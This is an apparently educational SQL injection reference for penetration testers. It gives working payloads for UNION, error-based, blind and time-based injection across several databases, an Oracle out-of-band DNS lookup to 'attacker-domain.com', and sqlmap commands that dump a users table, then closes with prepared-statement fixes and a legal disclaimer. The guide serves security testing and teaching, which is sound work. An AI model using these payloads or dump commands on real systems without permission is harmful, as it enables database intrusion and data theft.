## SQL Injection (SQLi) Technical Reference Guide

📌 Description

## SQL Injection (SQLi) is a critical web vulnerability that allows an attacker to interfere with the queries an application makes to its database. This can allow attackers to view, modify, or delete sensitive data, and in some cases, execute administrative operations or achieve Remote Code Execution (RCE).

🔍 SQLi Detection Methodology

To find SQLi, look for input fields, URL parameters, headers, or cookies that interact with a database back-end.

1.Triggering an Error: Inject special characters into parameters to break the syntax:

A. '

B. "

c. `

D. ')

E. ")

F. ;


2.Boolean Tests: Inject logical operators to verify if the application responds differently:

A. ' OR 1=1 -- -

B. ' OR 1=2 -- -


3. Mathematical Evaluation: Inject expressions to test if parameters are evaluated numerically:

1. Try targeting /item.php?id=5 with /item.php?id=6-1

2. If the application returns the same result for id=5 and id=6-1, numerical input is being evaluated.

⚡ SQLi Categories & Practical Payloads

1. In-Band (Classic) SQLi

Data is extracted using the same channel used to launch the attack.

A. UNION-Based SQLi

## Used when the query results are returned directly in the application's response.

1. Determine Column Count: Increment until an error or change in response occurs:

' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -  (Error! Indicates there are only 2 columns)


2. Determine Column Data Types: Look for which columns can hold string data:

' UNION SELECT 'a', NULL -- -
' UNION SELECT NULL, 'a' -- -


3.Retrieve Data (Targeting Database Version):

1. MySQL/MariaDB: ' UNION SELECT @@version, NULL -- -

2. PostgreSQL: ' UNION SELECT version(), NULL -- -

3. Microsoft SQL Server: ' UNION SELECT @@version, NULL -- -

4. Oracle: ' UNION SELECT banner, NULL FROM v$version -- -

B. Error-Based SQLi

Used when the response contains raw database error messages, allowing the attacker to force the database to leak sensitive data inside the error details.

1. UpdateXML Vector (MySQL):

' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) -- -


2.ExtractValue Vector (MySQL):

' AND extractvalue(1,concat(0x7e,database())) -- -


2. Inferential (Blind) SQLi

No data is transferred directly to the response. Attackers must reconstruct the data by asking the database "True" or "False" questions.

A. Boolean-Based Blind

The application response changes structure (e.g., "Welcome" message disappears) depending on whether the injected query evaluates to True or False.

# Payload Example (MySQL): Test if the first character of the database name is "a":

' AND SUBSTRING(database(),1,1)='a' -- -


B. Time-Based Blind

Used when the database does not show any visual differences in the response. The attacker forces the database to pause (sleep) before responding to verify if a condition is True.

1. MySQL Payload:

' AND IF(1=1, SLEEP(5), 0) -- -


2. PostgreSQL Payload:

' AND (SELECT 1 FROM PG_SLEEP(5)) -- -


3. Microsoft SQL Server Payload:

' IF(1=1) WAITFOR DELAY '0:0:5' -- -


3. Out-of-Band (OAST) SQLi

Used when the other techniques are unavailable, or server configurations block responses but allow outbound network traffic. The attacker forces the database to initiate a DNS or HTTP request to a server under their control (such as a Burp Collaborator instance).

A.DNS Lookup Vector (Oracle):

' UNION SELECT UTL_INADDR.get_host_address('attacker-domain.com') FROM dual -- -


🛠️ Automated Testing (SQLMap Guide)

When manual validation is completed, sqlmap can automate the data dumping process.

# Basic GET Scan

sqlmap -u "[http://target.com/page.php?id=1](http://target.com/page.php?id=1)" --batch


# Scan with an HTTP Request File (Highly Professional Method)

Save the full raw request from Burp Suite into a file (request.txt):

sqlmap -r request.txt -p id --batch


1. -r request.txt: Tells sqlmap to parse the cookie session, user-agents, and headers from your file.

2. -p id: Specifies the exact parameter to test (saves time and avoids crashing other endpoints).

# Database Enumeration & Dumping

# Get database names

sqlmap -r request.txt -p id --dbs

# List tables in a specific database

sqlmap -r request.txt -p id -D target_db --tables

# Dump data from a specific table

sqlmap -r request.txt -p id -D target_db -T users --dump


# Advanced Optimization Flags

# Speed up testing and inject deeper payloads

sqlmap -r request.txt --level=3 --risk=2 --threads=5


🛡️ Remediation & Prevention

1.Primary Prevention (Parameterized Queries / Prepared Statements): Ensures the database treats user input strictly as data, never as executable code.

# Insecure PHP:

$query = "SELECT * FROM users WHERE username = '" . $user . "'";


# Secure PHP (PDO Prepared Statement):

$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $user]);


2.Input Validation & Sanitization: Use strict allow-lists for expected data patterns.

3.Principle of Least Privilege: Configure the application's database user to only have permissions required to run the application (e.g., disable FILE privileges or drop database tables permissions).

> ⚠️ **Legal Disclaimer:** All techniques documented here are for authorized testing and educational purposes only. Never test against systems without explicit written permission.

